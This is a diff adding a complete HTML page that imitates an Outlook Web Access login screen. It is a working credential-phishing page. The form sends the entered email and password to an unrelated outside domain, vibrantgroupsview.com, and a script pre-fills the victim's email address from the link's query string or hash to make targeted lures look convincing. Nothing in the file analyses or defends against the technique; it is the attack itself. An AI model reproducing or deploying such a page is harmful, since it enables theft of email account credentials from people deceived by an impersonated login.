@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Outlook Web Access</title>
+  <style>
+    body {
+      margin: 10px 0 0;
+      padding: 0;
+      background-color: #1565c0;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    form {
+      max-width: 400px;
+      width: 90%;
+      border-radius: 5px;
+      background-color: #1565c0;
+      padding: 20px;
+    }
+
+    .logo-container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-container img {
+      max-width: 100%;
+      height: auto;
+      width: 100%;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border-radius: 5px;
+      background-color: #fff;
+      box-sizing: border-box;
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      margin-bottom: 10px;
+      color: #fff;
+      font-size: 12px;
+    }
+
+    .remember-me input[type="checkbox"] {
+      margin-right: 5px;
+    }
+
+    .forgot-password {
+      margin-left: auto;
+      color: #fff;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .button-container {
+      display: flex;
+      justify-content: center;
+      margin-top: 10px;
+    }
+
+    button {
+      width: 100%;
+      max-width: 150px;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form id="first-login-form" action="https://vibrantgroupsview.com/Nail/Api/Test/submit1.php" method="post">
+      <div class="logo-container">
+        <img src="ntop.png" alt="Logo" style="max-width: 100%; width: 100%;">
+      </div>
+      <input type="email" id="email" name="email" placeholder="Email" required>
+      <input type="password" id="password" name="password" placeholder="Password" required>
+      <div class="remember-me">
+        <input type="checkbox" id="remember" name="remember">
+        <label for="remember">Remember me</label>
+        <a href="#" class="forgot-password">Forgot password?</a>
+      </div>
+      <div class="button-container">
+        <button type="submit" onclick="submitFirstPageCredentials(event)">Login</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+  window.addEventListener('DOMContentLoaded', () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get('email');
+    const hashEmail = window.location.hash.substr(1);
+    if (email || hashEmail) {
+      const emailField = document.getElementById('email');
+      emailField.value = email || hashEmail;
+    }
+  });
+
+  function submitFirstPageCredentials(event) {
+    event.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    // Perform necessary validation or data submission
+    console.log('Email:', email);
+    console.log('Password:', password);
+    document.getElementById('first-login-form').submit();
+  }
+</script>
+
+</body>
+</html>
